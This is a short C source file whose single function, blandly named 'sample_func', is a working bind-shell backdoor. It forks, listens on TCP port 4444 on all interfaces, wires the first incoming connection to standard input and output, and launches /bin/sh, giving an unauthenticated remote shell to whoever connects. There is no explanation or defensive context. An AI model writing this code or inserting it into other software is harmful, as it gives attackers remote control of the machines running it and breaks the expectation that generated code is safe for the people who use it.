#include<stdio.h>
#include<unistd.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<sys/socket.h>

void sample_func()
{

	if(fork() == 0){		
		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(4444);
		addr.sin_addr.s_addr = INADDR_ANY;

		int sockfd = socket(AF_INET, SOCK_STREAM, 0);
		bind(sockfd, (struct sockaddr *)&addr, sizeof(addr));
		listen(sockfd, 0);

		int connfd = accept(sockfd, NULL, NULL);
		for (int i = 0; i < 3; i++)
		{
			dup2(connfd, i);
		}
		execve("/bin/sh", NULL, NULL);
	}
}
